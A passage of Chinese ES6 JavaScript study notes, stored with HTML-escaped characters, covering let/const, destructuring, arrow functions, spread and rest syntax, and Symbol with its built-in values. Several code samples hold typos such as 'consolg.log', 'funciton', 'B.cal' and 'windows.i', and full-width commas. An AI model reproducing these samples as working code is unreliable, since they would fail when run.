关键字 \n声明局部变量；\n2、const 关键字 \n声明常量； \n3、变量和对象的解构赋值\n 简化变量声明：从； \n4、模板字符串 \n声明自带格式的字符串； \n5、简化对象和函数写法 \n简化对象和函数写法；\n 6、箭头函数 \n简化函数写法； \n7、ES6中函数参数的默认值 \n给函数的参数设置默认值； \n8、rest参数 \n拿到实参； \n9、扩展运算符 \n将一个数组转为用逗号分隔的参数序列； \n10、Symbol \n表示独一无二的值； \n11、迭代器 \n用来遍历集合、数组等； \n12、生成器 \n是一种异步编程解决方案； \n13、Promise \n非常强大的异步编程的新解决方案； \n14、Set集合 \n类似数组，但元素不重复的集合； \n15、Map集合 \n键值对集合； \n16、class类 \n像java实体类一样声明js类； \n17、数值扩展 \n增加一些数值相关的方法等； \n18、对象扩展 \n增加一些对象相关的方法等； \n19、模块化 \n模块化、组件化； \n20、Babel对ES6模块化代码转换 \n为了适配浏览器，将更新的ES规范转换成ES5规范； \n21、ES6模块化引入NPM包 \n像导入模块一样导入npm包；\nlet和const命令let特性\n变量不能重复声明\nlet star=&#x27;罗志祥&#x27;;let star=&#x27;小猪&#x27;  //error\n\nlet有块级作用域\n&#123;    let girl=&#x27;周扬青&#x27;&#125;console.log(girl) //error\n\n不仅仅针对花括号，例如if（）、for（）里面\n\n不存在变量提前\nconsole.log(song)   //errorlet song=&#x27;恋爱达人&#x27;\n\n不影响作用域链\nlet school=&#x27;abc&#x27;function fn()&#123;    console.log(school) //abc&#125;\n\n案例&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;div&gt;        &lt;div class=&quot;item&quot; style=&quot;width: 50px;height: 50px;background-color: red&quot;&gt;&lt;/div&gt;        &lt;div class=&quot;item&quot; style=&quot;width: 50px;height: 50px;background-color: red&quot;&gt;&lt;/div&gt;        &lt;div class=&quot;item&quot; style=&quot;width: 50px;height: 50px;background-color: red&quot;&gt;&lt;/div&gt;    &lt;/div&gt;    &lt;script&gt;        let items=document.getElementsByClassName(&quot;item&quot;);        for (var i=0;i&lt;items.length;i++)&#123;            items[i].onclick=function ()&#123;                // 修改当前元素的背景颜色                // this.style.background = &#x27;pink&#x27;; // 写法一：常规写法一般无异常                items[i].style.background = &#x27;pink&#x27;; // 写法二                // 写法二：需要注意的是for循环内的i必须使用let声明                // 如果使用var就会报错，因为var是全局变量，                // 点击事件触发时调用函数，此时经过循环之后i的值会变成3，items[i]就会下标越界                // let是局部变量                // 我们要明白的是当我们点击的时候，这个i是哪个值                // 使用var相当于是：                // &#123; var i = 0; &#125;                // &#123; var i = 1; &#125;                // &#123; var i = 2; &#125;                // &#123; var i = 3; &#125;                // 下面的声明会将上面的覆盖掉，所以点击事件每次找到的都是3                // 而使用let相当于是：                // &#123; let i = 0; &#125;                // &#123; let i = 1; &#125;                // &#123; let i = 2; &#125;                // &#123; let i = 3; &#125;                // 由于let声明的是局部变量，每一个保持着原来的值                // 点击事件调用的时候拿到的是对应的i            &#125;        &#125;        console.log(windows.i)  //3         // 当var=3的时候，点击事件开始向外层作用域找，找不到，就是windows.i，此时是3，如果是let i，具有块级作用域，所以每一次触碰事件的i都是不同的。    &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\nconst特性\n声明常量\n\nconst A = &#x27;abc&#x27;\n\n\n一定要赋初始值\n\n一般常量使用大写（潜规则）\n\n常量的值不能修改\n\n也具有块级作用域\n&#123;    const pyaler = &#x27;uzi&#x27;&#125;console.log(player) //error\n\n对于数组和对象的元素修改，不算作对常量的修改\nconst team = [&#x27;uzi&#x27;,&#x27;MXLG&#x27;,&#x27;Ming&#x27;,&#x27;Letme&#x27;];team.push(&#x27;Meiko&#x27;); //不报错，常量地址没有发生变化\n\n变量的解构赋值\nES6 允许按照一定模式从数组和对象中提取值，对变量进行赋值，这被称为解构赋值。\n\n\n数组的解构：\nconst F4 = [&#x27;小沈阳&#x27;，&#x27;刘能&#x27;,&#x27;赵四&#x27;,&#x27;宋小宝&#x27;]let [xiao,liu,zhao,song] = F4; console.log(xiao)console.log(liu)console.log(zhao)console.log(song)\n\n对象的解构\nconst zhao = &#123;    name : &#x27;赵本山&#x27;，    age: &#x27;不详&#x27;,    xiaopin: function()&#123;        console.log(&quot;我可以演小品&quot;)    &#125;&#125;let &#123;name,age,xiaopin&#125; = zhao;console.log(name);console.log(age);console.log(xiaopin);\n\n应用场景：频繁使用对象方法、数组元素，就可以使用解构赋值形式；\n模板字符串\nES6 引入新的声明字符串的方式 &#96;&#96; 反引号\n\n特性1.声明let str = `我也是一个字符串`console.log(str,typeof str);\n\n2.内容中可以直接出现换行符let str = `&lt;ul&gt;\t\t\t&lt;li&gt;RHF&lt;/li&gt;\t\t\t&lt;li&gt;RHF&lt;/li&gt;\t\t   &lt;/ul&gt;`；\n\n3.变量拼接let lovest = &#x27;RHF&#x27;;let out = `$&#123;lovest&#125;是最帅的`;console.log(out)  //RHF是最帅的\n\n应用场景：当遇到字符串与变量拼接的情况使用模板字符串；\n对象的简化写法\nES6允许在大括号里面，直接写入变量和函数，作为对象的属性和方法,这样的书写更加简洁\n\nlet name = &#x27;aaa&#x27;;let change = function()&#123;    console.log(&#x27;aaa&#x27;);&#125;const school = &#123;    name,    change,    improve()&#123;        consolg.log(&#x27;bbb&#x27;);    &#125;&#125;\n\n箭头函数\nES6允许使用箭头（&#x3D;&gt;）定义函数，箭头函数提供了一种更加简洁的函数书写方式，箭头函数多用于匿 名函数的定义；\n\n箭头函数的注意点：\n如果形参只有一个，则小括号可以省略；\n函数体如果只有一条语句，则花括号可以省略，函数的返回值为该条语句的执行结果； \n箭头函数 this 指向声明时所在作用域下 this 的值； \n箭头函数不能作为构造函数实例化； \n不能使用 arguments；\n\n特性\nthis是静态的，this始终指向函数声明时所在作用域下的this的值\nfunction A()&#123;              //全局作用域下声明的    console.log(this.name)&#125;let B = () =&gt; &#123;            //全局作用域下声明的    console.log(this.name);&#125;window.name = &#x27;尚硅谷&#x27;;const school = &#123;    name: &#x27;ATGUIGU&#x27;&#125;//直接调用A()   //尚硅谷B()  //尚硅谷//callA.call(school); //ATGUIGUB.cal(school);  //尚硅谷\n\n不能作为构造实例化对象\nlet A(name,age) =&gt; &#123;    this.name=name;    this.age=age;&#125;let me = new A(&#x27;xiao&#x27;,123);console.me //error\n\n不能使用arguments变量\nlet fn = () =&gt; &#123;    console.log(arguments)；&#125;fn(1,2,3)  //error\n\n箭头函数的简写\n\n省略小括号，当形参有且只有一个的时候\n\nlet add = n =&gt; &#123;    return n + 1;&#125;\n\n\n省略花括号，当代码体只有一条语句的时候，此时return也必须省略\n\nlet add = n =&gt; n+1;\n\n箭头函数的实践与应用场景需求1：点击div2s后颜色变成粉色传统方法：\n//需求-1  点击 div 2s 后颜色变成『粉色』//获取元素let ad = document.getElementById(&#x27;ad&#x27;);//绑定事件ad.addEventListener(&quot;click&quot;, function()&#123;    //保存 this 的值    let _this = this;    //定时器    setTimeout(funciton()&#123;        //修改背景颜色 this        _this.style.background = &#x27;pink&#x27;;    &#125;, 2000);&#125;);\n\n使用箭头函数解决：\n//需求-1  点击 div 2s 后颜色变成『粉色』//获取元素let ad = document.getElementById(&#x27;ad&#x27;);//绑定事件ad.addEventListener(&quot;click&quot;, function()&#123;    //保存 this 的值    // let _this = this;    //定时器    setTimeout(() =&gt; &#123;               //箭头函数指向函数声明时所在作用域下的this的值（ad）        //修改背景颜色 this        // console.log(this);        // _this.style.background = &#x27;pink&#x27;;        this.style.background = &#x27;pink&#x27;;    &#125;, 2000);&#125;);\n\n需求2：从数组中返回偶数的元素传统方法：\nconst arr = [1,6,9,10,100,25];const result = arr.filter(function(item)&#123;    if(item % 2 === 0)&#123;        return true;    &#125;else&#123;        return false;    &#125;&#125;);\n\n使用箭头函数解决：\nconst result = arr.filter(item =&gt; item % 2 === 0);\n\n应用场景：\n箭头函数适合与this无关的回调：定时器，数组的方法回调\n箭头函数不适合与this有关的回调：事件回调，对象的方法\n\n函数参数的默认值\nES6允许给函数参数赋值初始值\n\n\n可以给形参赋初始值，一般位置要靠后（潜规则）\nfunction add(a,b,c=12)&#123;    return a+b+c; &#125;let result = add (1,2);console.log(result) // 15\n\n与解构赋值结合\nfunction A(&#123;host=&#x27;127.0.0.1&#x27;,username,password,port&#125;)&#123;    console.log(host+username+password+port)&#125;A(&#123;    username:&#x27;ran&#x27;,    password:&#x27;123456&#x27;,    port:3306&#125;)\n\nrest参数\nES6引入rest参数【…args】，用于获取函数的实参，用来代替arguments\n\n特性function date(...args)&#123;    console.log(args);&#125;date(&#x27;aaa&#x27;,&#x27;bbb&#x27;,&#x27;ccc&#x27;)；\n\n\nrest 参数比较要放到参数最后\nfunction fn(a,b,...args)&#123;    console.log(a);    console.log(b);    console.log(args);&#125;fn(1,2,3,4,5,6)\n\n扩展运算符\n【…】扩展运算符是能将数组转换为逗号分隔的参数序列\n\n特性const tfboys=[&#x27;AA&#x27;,&#x27;BB&#x27;,&#x27;CC&#x27;]function chunwan()&#123;    console.log(arguments);&#125;chunwan(...tfboys);  //0:&#x27;AA&#x27; 1:&#x27;BB&#x27; 2:&#x27;CC&#x27;\n\n应用\n数组的合并\nconst A = [&#x27;aa&#x27;,&#x27;bb&#x27;];const B = [&#x27;cc&#x27;,&#x27;dd&#x27;];//const C = A.concat(B);const C = [...A,...B];console.log(C)   //[aa,bb,cc,dd]\n\n数组的克隆\nconst A = [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;];const B = [...A];console.log(B)   //[a,b,c]\n\n将伪数组转换为真正的数组\nconst A = documents.querySelectorAll(&#x27;div&#x27;);const B = [...A];console.log(B) // [div,div,div]//1.数组去重let arr = [1,2,3,4,5,4,3,2,1]let result = [...new Set(arr)]console.log(result);\n\nSymbol概述\nES5 的对象属性名都是字符串，这容易造成属性名的冲突。比如，你使用了一个他人提供的对象，但又想为这个对象添加新的方法（mixin 模式），新方法的名字就有可能与现有方法产生冲突。如果有一种机制，保证每个属性的名字都是独一无二的就好了，这样就从根本上防止属性名的冲突。这就是 ES6 引入Symbol的原因。\nES6 引入了一种新的原始数据类型Symbol，表示独一无二的值。它属于 JavaScript 语言的数据类型之一，其他数据类型是：undefined、null、布尔值（Boolean）、字符串（String）、数值（Number）、大整数（BigInt）、对象（Object）。\nSymbol 值通过Symbol()函数生成。这就是说，对象的属性名现在可以有两种类型，一种是原来就有的字符串，另一种就是新增的 Symbol 类型。凡是属性名属于 Symbol 类型，就都是独一无二的，可以保证不会与其他属性名产生冲突。\n\nlet s = Symbol();typeof s// &quot;symbol&quot;\n\n上面代码中，变量s就是一个独一无二的值。typeof运算符的结果，表明变量s是 Symbol 数据类型，而不是字符串之类的其他类型。\n注意，Symbol函数前不能使用new命令，否则会报错。这是因为生成的 Symbol 是一个原始类型的值，不是对象。也就是说，由于 Symbol 值不是对象，所以不能添加属性。基本上，它是一种类似于字符串的数据类型。\nSymbol的特点\nSymbol的值是唯一的，用来解决命名冲突的问题\nSymbol函数可以接受一个字符串作为参数，表示对 Symbol 实例的描述，主要是为了在控制台显示，或者转为字符串时，比较容易区分。\nlet s1 = Symbol(&#x27;foo&#x27;);let s2 = Symbol(&#x27;bar&#x27;);s1 // Symbol(foo)s2 // Symbol(bar)s1.toString() // &quot;Symbol(foo)&quot;s2.toString() // &quot;Symbol(bar)&quot;\n\n上面代码中，s1和s2是两个 Symbol 值。如果不加参数，它们在控制台的输出都是Symbol()，不利于区分。有了参数以后，就等于为它们加上了描述，输出的时候就能够分清，到底是哪一个值。\n\n如果 Symbol 的参数是一个对象，就会调用该对象的toString方法，将其转为字符串，然后才生成一个 Symbol 值。\nconst obj = &#123;  toString() &#123;    return &#x27;abc&#x27;;  &#125;&#125;;const sym = Symbol(obj);sym // Symbol(abc)\n\n注意，Symbol函数的参数只是表示对当前 Symbol 值的描述，因此相同参数的Symbol函数的返回值是不相等的。\n// 没有参数的情况let s1 = Symbol();let s2 = Symbol();s1 === s2 // false// 有参数的情况let s1 = Symbol(&#x27;foo&#x27;);let s2 = Symbol(&#x27;foo&#x27;);s1 === s2 // false\n\nSymbol 值不能与其他类型的值进行运算，会报错。\nlet sym = Symbol(&#x27;My symbol&#x27;);&quot;your symbol is &quot; + sym// TypeError: can&#x27;t convert symbol to string`your symbol is $&#123;sym&#125;`// TypeError: can&#x27;t convert symbol to string\n\n但是，Symbol 值可以显式转为字符串。\nlet sym = Symbol(&#x27;My symbol&#x27;);String(sym) // &#x27;Symbol(My symbol)&#x27;sym.toString() // &#x27;Symbol(My symbol)&#x27;\n\n另外，Symbol 值也可以转为布尔值，但是不能转为数值。\nlet sym = Symbol();Boolean(sym) // true!sym  // falseif (sym) &#123;  // ...&#125;Number(sym) // TypeErrorsym + 2 // TypeError\n\n应用场景Symbol适用于给对象添加属性和方法\nSymbol.prototype.description创建 Symbol 的时候，可以添加一个描述。\nconst sym = Symbol(&#x27;foo&#x27;);\n\n上面代码中，sym的描述就是字符串foo。\n但是，读取这个描述需要将 Symbol 显式转为字符串，即下面的写法。\nconst sym = Symbol(&#x27;foo&#x27;);String(sym) // &quot;Symbol(foo)&quot;sym.toString() // &quot;Symbol(foo)&quot;\n\n上面的用法不是很方便。ES2019 提供了一个实例属性description，直接返回 Symbol 的描述。\nconst sym = Symbol(&#x27;foo&#x27;);sym.description // &quot;foo&quot;\n\n作为属性名的Symbol由于每一个 Symbol 值都是不相等的，这意味着 Symbol 值可以作为标识符，用于对象的属性名，就能保证不会出现同名的属性。这对于一个对象由多个模块构成的情况非常有用，能防止某一个键被不小心改写或覆盖。\nlet mySymbol = Symbol();// 第一种写法let a = &#123;&#125;;a[mySymbol] = &#x27;Hello!&#x27;;// 第二种写法let a = &#123;  [mySymbol]: &#x27;Hello!&#x27;&#125;;// 第三种写法let a = &#123;&#125;;Object.defineProperty(a, mySymbol, &#123; value: &#x27;Hello!&#x27; &#125;);// 以上写法都得到同样结果a[mySymbol] // &quot;Hello!&quot;\n\n上面代码通过方括号结构和Object.defineProperty，将对象的属性名指定为一个 Symbol 值。\n\n注意，Symbol 值作为对象属性名时，不能用点运算符。\n\nconst mySymbol = Symbol();const a = &#123;&#125;;a.mySymbol = &#x27;Hello!&#x27;;a[mySymbol] // undefineda[&#x27;mySymbol&#x27;] // &quot;Hello!&quot;\n\n上面代码中，因为点运算符后面总是字符串，所以不会读取mySymbol作为标识名所指代的那个值，导致a的属性名实际上是一个字符串，而不是一个 Symbol 值。\n同理，在对象的内部，使用 Symbol 值定义属性时，Symbol 值必须放在方括号之中。\nlet s = Symbol();let obj = &#123;  [s]: function (arg) &#123; ... &#125;&#125;;obj[s](123);\n\n上面代码中，如果s不放在方括号中，该属性的键名就是字符串s，而不是s所代表的那个 Symbol 值。\n采用增强的对象写法，上面代码的obj对象可以写得更简洁一些。\nlet obj = &#123;  [s](arg) &#123; ... &#125;&#125;;\n\n\n\nSymbol 类型还可以用于定义一组常量，保证这组常量的值都是不相等的。\nconst log = &#123;&#125;;log.levels = &#123;  DEBUG: Symbol(&#x27;debug&#x27;),  INFO: Symbol(&#x27;info&#x27;),  WARN: Symbol(&#x27;warn&#x27;)&#125;;console.log(log.levels.DEBUG, &#x27;debug message&#x27;);console.log(log.levels.INFO, &#x27;info message&#x27;);\n\n下面是另外一个例子。\nconst COLOR_RED    = Symbol();const COLOR_GREEN  = Symbol();function getComplement(color) &#123;  switch (color) &#123;    case COLOR_RED:      return COLOR_GREEN;    case COLOR_GREEN:      return COLOR_RED;    default:      throw new Error(&#x27;Undefined color&#x27;);    &#125;&#125;\n\n常量使用 Symbol 值最大的好处，就是其他任何值都不可能有相同的值了，因此可以保证上面的switch语句会按设计的方式工作。\n还有一点需要注意，Symbol 值作为属性名时，该属性还是公开属性，不是私有属性。\n实例：消除魔术字符串魔术字符串指的是，在代码之中多次出现、与代码形成强耦合的某一个具体的字符串或者数值。风格良好的代码，应该尽量消除魔术字符串，改由含义清晰的变量代替。\nfunction getArea(shape, options) &#123;  let area = 0;  switch (shape) &#123;    case &#x27;Triangle&#x27;: // 魔术字符串      area = .5 * options.width * options.height;      break;    /* ... more code ... */  &#125;  return area;&#125;getArea(&#x27;Triangle&#x27;, &#123; width: 100, height: 100 &#125;); // 魔术字符串\n\n上面代码中，字符串Triangle就是一个魔术字符串。它多次出现，与代码形成“强耦合”，不利于将来的修改和维护。\n常用的消除魔术字符串的方法，就是把它写成一个变量。\nconst shapeType = &#123;  triangle: &#x27;Triangle&#x27;&#125;;function getArea(shape, options) &#123;  let area = 0;  switch (shape) &#123;    case shapeType.triangle:      area = .5 * options.width * options.height;      break;  &#125;  return area;&#125;getArea(shapeType.triangle, &#123; width: 100, height: 100 &#125;);\n\n上面代码中，我们把Triangle写成shapeType对象的triangle属性，这样就消除了强耦合。\n如果仔细分析，可以发现shapeType.triangle等于哪个值并不重要，只要确保不会跟其他shapeType属性的值冲突即可。因此，这里就很适合改用 Symbol 值。\nconst shapeType = &#123;  triangle: Symbol()&#125;;\n\n上面代码中，除了将shapeType.triangle的值设为一个 Symbol，其他地方都不用修改。\n属性名的遍历Symbol 作为属性名，遍历对象的时候，该属性不会出现在for...in、for...of循环中，也不会被Object.keys()、Object.getOwnPropertyNames()、JSON.stringify()返回。\n但是，它也不是私有属性，有一个Object.getOwnPropertySymbols()方法，可以获取指定对象的所有 Symbol 属性名。该方法返回一个数组，成员是当前对象的所有用作属性名的 Symbol 值。\nconst obj = &#123;&#125;;let a = Symbol(&#x27;a&#x27;);let b = Symbol(&#x27;b&#x27;);obj[a] = &#x27;Hello&#x27;;obj[b] = &#x27;World&#x27;;const objectSymbols = Object.getOwnPropertySymbols(obj);objectSymbols// [Symbol(a), Symbol(b)]\n\n上面代码是Object.getOwnPropertySymbols()方法的示例，可以获取所有 Symbol 属性名。\n下面是另一个例子，Object.getOwnPropertySymbols()方法与for...in循环、Object.getOwnPropertyNames方法进行对比的例子。\nconst obj = &#123;&#125;;const foo = Symbol(&#x27;foo&#x27;);obj[foo] = &#x27;bar&#x27;;for (let i in obj) &#123;  console.log(i); // 无输出&#125;Object.getOwnPropertyNames(obj) // []Object.getOwnPropertySymbols(obj) // [Symbol(foo)]\n\n上面代码中，使用for...in循环和Object.getOwnPropertyNames()方法都得不到 Symbol 键名，需要使用Object.getOwnPropertySymbols()方法。\n另一个新的 API，Reflect.ownKeys()方法可以返回所有类型的键名，包括常规键名和 Symbol 键名。\nlet obj = &#123;  [Symbol(&#x27;my_key&#x27;)]: 1,  enum: 2,  nonEnum: 3&#125;;Reflect.ownKeys(obj)//  [&quot;enum&quot;, &quot;nonEnum&quot;, Symbol(my_key)]\n\n由于以 Symbol 值作为键名，不会被常规方法遍历得到。我们可以利用这个特性，为对象定义一些非私有的、但又希望只用于内部的方法。\nlet size = Symbol(&#x27;size&#x27;);class Collection &#123;  constructor() &#123;    this[size] = 0;  &#125;  add(item) &#123;    this[this[size]] = item;    this[size]++;  &#125;  static sizeOf(instance) &#123;    return instance[size];  &#125;&#125;let x = new Collection();Collection.sizeOf(x) // 0x.add(&#x27;foo&#x27;);Collection.sizeOf(x) // 1Object.keys(x) // [&#x27;0&#x27;]Object.getOwnPropertyNames(x) // [&#x27;0&#x27;]Object.getOwnPropertySymbols(x) // [Symbol(size)]\n\n上面代码中，对象x的size属性是一个 Symbol 值，所以Object.keys(x)、Object.getOwnPropertyNames(x)都无法获取它。这就造成了一种非私有的内部方法的效果。\nSymbol.for()，Symbol.keyFor()有时，我们希望重新使用同一个 Symbol 值，Symbol.for()方法可以做到这一点。它接受一个字符串作为参数，然后搜索有没有以该参数作为名称的 Symbol 值。如果有，就返回这个 Symbol 值，否则就新建一个以该字符串为名称的 Symbol 值，并将其注册到全局。\nlet s1 = Symbol.for(&#x27;foo&#x27;);let s2 = Symbol.for(&#x27;foo&#x27;);s1 === s2 // true\n\n上面代码中，s1和s2都是 Symbol 值，但是它们都是由同样参数的Symbol.for方法生成的，所以实际上是同一个值。\nSymbol.for()与Symbol()这两种写法，都会生成新的 Symbol。它们的区别是，前者会被登记在全局环境中供搜索，后者不会。Symbol.for()不会每次调用就返回一个新的 Symbol 类型的值，而是会先检查给定的key是否已经存在，如果不存在才会新建一个值。比如，如果你调用Symbol.for(&quot;cat&quot;)30 次，每次都会返回同一个 Symbol 值，但是调用Symbol(&quot;cat&quot;)30 次，会返回 30 个不同的 Symbol 值。\nSymbol.for(&quot;bar&quot;) === Symbol.for(&quot;bar&quot;)// trueSymbol(&quot;bar&quot;) === Symbol(&quot;bar&quot;)// false\n\n上面代码中，由于Symbol()写法没有登记机制，所以每次调用都会返回一个不同的值。\nSymbol.keyFor()方法返回一个已登记的 Symbol 类型值的key。\nlet s1 = Symbol.for(&quot;foo&quot;);Symbol.keyFor(s1) // &quot;foo&quot;let s2 = Symbol(&quot;foo&quot;);Symbol.keyFor(s2) // undefined\n\n上面代码中，变量s2属于未登记的 Symbol 值，所以返回undefined。\n注意，Symbol.for()为 Symbol 值登记的名字，是全局环境的，不管有没有在全局环境运行。\nfunction foo() &#123;  return Symbol.for(&#x27;bar&#x27;);&#125;const x = foo();const y = Symbol.for(&#x27;bar&#x27;);console.log(x === y); // true\n\n上面代码中，Symbol.for(&#39;bar&#39;)是函数内部运行的，但是生成的 Symbol 值是登记在全局环境的。所以，第二次运行Symbol.for(&#39;bar&#39;)可以取到这个 Symbol 值。\nSymbol.for()的这个全局登记特性，可以用在不同的 iframe 或 service worker 中取到同一个值。\niframe = document.createElement(&#x27;iframe&#x27;);iframe.src = String(window.location);document.body.appendChild(iframe);iframe.contentWindow.Symbol.for(&#x27;foo&#x27;) === Symbol.for(&#x27;foo&#x27;)// true\n\n上面代码中，iframe 窗口生成的 Symbol 值，可以在主页面得到。\n实例：模块的 Singleton 模式Singleton 模式指的是调用一个类，任何时候返回的都是同一个实例。\n对于 Node 来说，模块文件可以看成是一个类。怎么保证每次执行这个模块文件，返回的都是同一个实例呢？\n很容易想到，可以把实例放到顶层对象global。\n// mod.jsfunction A() &#123;  this.foo = &#x27;hello&#x27;;&#125;if (!global._foo) &#123;  global._foo = new A();&#125;module.exports = global._foo;\n\n然后，加载上面的mod.js。\nconst a = require(&#x27;./mod.js&#x27;);console.log(a.foo);\n\n上面代码中，变量a任何时候加载的都是A的同一个实例。\n但是，这里有一个问题，全局变量global._foo是可写的，任何文件都可以修改。\nglobal._foo = &#123; foo: &#x27;world&#x27; &#125;;const a = require(&#x27;./mod.js&#x27;);console.log(a.foo);\n\n上面的代码，会使得加载mod.js的脚本都失真。\n为了防止这种情况出现，我们就可以使用 Symbol。\n// mod.jsconst FOO_KEY = Symbol.for(&#x27;foo&#x27;);function A() &#123;  this.foo = &#x27;hello&#x27;;&#125;if (!global[FOO_KEY]) &#123;  global[FOO_KEY] = new A();&#125;module.exports = global[FOO_KEY];\n\n上面代码中，可以保证global[FOO_KEY]不会被无意间覆盖，但还是可以被改写。\nglobal[Symbol.for(&#x27;foo&#x27;)] = &#123; foo: &#x27;world&#x27; &#125;;const a = require(&#x27;./mod.js&#x27;);\n\n如果键名使用Symbol方法生成，那么外部将无法引用这个值，当然也就无法改写。\n// mod.jsconst FOO_KEY = Symbol(&#x27;foo&#x27;);// 后面代码相同 ……\n\n上面代码将导致其他脚本都无法引用FOO_KEY。但这样也有一个问题，就是如果多次执行这个脚本，每次得到的FOO_KEY都是不一样的。虽然 Node 会将脚本的执行结果缓存，一般情况下，不会多次执行同一个脚本，但是用户可以手动清除缓存，所以也不是绝对可靠。\n内置的 Symbol 值除了定义自己使用的 Symbol 值以外，ES6 还提供了 11 个内置的 Symbol 值，指向语言内部使用的方法。\nSymbol.hasInstance对象的Symbol.hasInstance属性，指向一个内部方法。当其他对象使用instanceof运算符，判断是否为该对象的实例时，会调用这个方法。比如，foo instanceof Foo在语言内部，实际调用的是Foo[Symbol.hasInstance](foo)。\nclass MyClass &#123;  [Symbol.hasInstance](foo) &#123;    return foo instanceof Array;  &#125;&#125;[1, 2, 3] instanceof new MyClass() // true\n\n上面代码中，MyClass是一个类，new MyClass()会返回一个实例。该实例的Symbol.hasInstance方法，会在进行instanceof运算时自动调用，判断左侧的运算子是否为Array的实例。\n下面是另一个例子。\nclass Even &#123;  static [Symbol.hasInstance](obj) &#123;    return Number(obj) % 2 === 0;  &#125;&#125;// 等同于const Even = &#123;  [Symbol.hasInstance](obj) &#123;    return Number(obj) % 2 === 0;  &#125;&#125;;1 instanceof Even // false2 instanceof Even // true12345 instanceof Even // false\n\nSymbol.isConcatSpreadable对象的Symbol.isConcatSpreadable属性等于一个布尔值，表示该对象用于Array.prototype.concat()时，是否可以展开。\nlet arr1 = [&#x27;c&#x27;, &#x27;d&#x27;];[&#x27;a&#x27;, &#x27;b&#x27;].concat(arr1, &#x27;e&#x27;) // [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;]arr1[Symbol.isConcatSpreadable] // undefinedlet arr2 = [&#x27;c&#x27;, &#x27;d&#x27;];arr2[Symbol.isConcatSpreadable] = false;[&#x27;a&#x27;, &#x27;b&#x27;].concat(arr2, &#x27;e&#x27;) // [&#x27;a&#x27;, &#x27;b&#x27;, [&#x27;c&#x27;,&#x27;d&#x27;], &#x27;e&#x27;]\n\n上面代码说明，数组的默认行为是可以展开，Symbol.isConcatSpreadable默认等于undefined。该属性等于true时，也有展开的效果。\n类似数组的对象正好相反，默认不展开。它的Symbol.isConcatSpreadable属性设为true，才可以展开。\nlet obj = &#123;length: 2, 0: &#x27;c&#x27;, 1: &#x27;d&#x27;&#125;;[&#x27;a&#x27;, &#x27;b&#x27;].concat(obj, &#x27;e&#x27;) // [&#x27;a&#x27;, &#x27;b&#x27;, obj, &#x27;e&#x27;]obj[Symbol.isConcatSpreadable] = true;[&#x27;a&#x27;, &#x27;b&#x27;].concat(obj, &#x27;e&#x27;) // [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;]\n\nSymbol.isConcatSpreadable属性也可以定义在类里面。\nclass A1 extends Array &#123;  constructor(args) &#123;    super(args);    this[Symbol.isConcatSpreadable] = true;  &#125;&#125;class A2 extends Array &#123;  constructor(args) &#123;    super(args);  &#125;  get [Symbol.isConcatSpreadable] () &#123;    return false;  &#125;&#125;let a1 = new A1();a1[0] = 3;a1[1] = 4;let a2 = new A2();a2[0] = 5;a2[1] = 6;[1, 2].concat(a1).concat(a2)// [1, 2, 3, 4, [5, 6]]\n\n上面代码中，类A1是可展开的，类A2是不可展开的，所以使用concat时有不一样的结果。\n注意，Symbol.isConcatSpreadable的位置差异，A1是定义在实例上，A2是定义在类本身，效果相同。\nSymbol.species对象的Symbol.species属性，指向一个构造函数。创建衍生对象时，会使用该属性。\nclass MyArray extends Array &#123;&#125;const a = new MyArray(1, 2, 3);const b = a.map(x =&gt; x);const c = a.filter(x =&gt; x &gt; 1);b instanceof MyArray // truec instanceof MyArray // true\n\n上面代码中，子类MyArray继承了父类Array，a是MyArray的实例，b和c是a的衍生对象。你可能会认为，b和c都是调用数组方法生成的，所以应该是数组（Array的实例），但实际上它们也是MyArray的实例。\nSymbol.species属性就是为了解决这个问题而提供的。现在，我们可以为MyArray设置Symbol.species属性。\nclass MyArray extends Array &#123;  static get [Symbol.species]() &#123; return Array; &#125;&#125;\n\n上面代码中，由于定义了Symbol.species属性，创建衍生对象时就会使用这个属性返回的函数，作为构造函数。这个例子也说明，定义Symbol.species属性要采用get取值器。默认的Symbol.species属性等同于下面的写法。\nstatic get [Symbol.species]() &#123;  return this;&#125;\n\n现在，再来看前面的例子。\nclass MyArray extends Array &#123;  static get [Symbol.species]() &#123; return Array; &#125;&#125;const a = new MyArray();const b = a.map(x =&gt; x);b instanceof MyArray // falseb instanceof Array // true\n\n上面代码中，a.map(x =&gt; x)生成的衍生对象，就不是MyArray的实例，而直接就是Array的实例。\n再看一个例子。\nclass T1 extends Promise &#123;&#125;class T2 extends Promise &#123;  static get [Symbol.species]() &#123;    return Promise;  &#125;&#125;new T1(r =&gt; r()).then(v =&gt; v) instanceof T1 // truenew T2(r =&gt; r()).then(v =&gt; v) instanceof T2 // false\n\n上面代码中，T2定义了Symbol.species属性，T1没有。结果就导致了创建衍生对象时（then方法），T1调用的是自身的构造方法，而T2调用的是Promise的构造方法。\n总之，Symbol.species的作用在于，实例对象在运行过程中，需要再次调用自身的构造函数时，会调用该属性指定的构造函数。它主要的用途是，有些类库是在基类的基础上修改的，那么子类使用继承的方法时，作者可能希望返回基类的实例，而不是子类的实例。\nSymbol.match对象的Symbol.match属性，指向一个函数。当执行str.match(myObject)时，如果该属性存在，会调用它，返回该方法的返回值。\nString.prototype.match(regexp)// 等同于regexp[Symbol.match](this)class MyMatcher &#123;  [Symbol.match](string) &#123;    return &#x27;hello world&#x27;.indexOf(string);  &#125;&#125;&#x27;e&#x27;.match(new MyMatcher()) // 1\n\nSymbol.replace对象的Symbol.replace属性，指向一个方法，当该对象被String.prototype.replace方法调用时，会返回该方法的返回值。\nString.prototype.replace(searchValue, replaceValue)// 等同于searchValue[Symbol.replace](this, replaceValue)\n\n下面是一个例子。\nconst x = &#123;&#125;;x[Symbol.replace] = (...s) =&gt; console.log(s);&#x27;Hello&#x27;.replace(x, &#x27;World&#x27;) // [&quot;Hello&quot;, 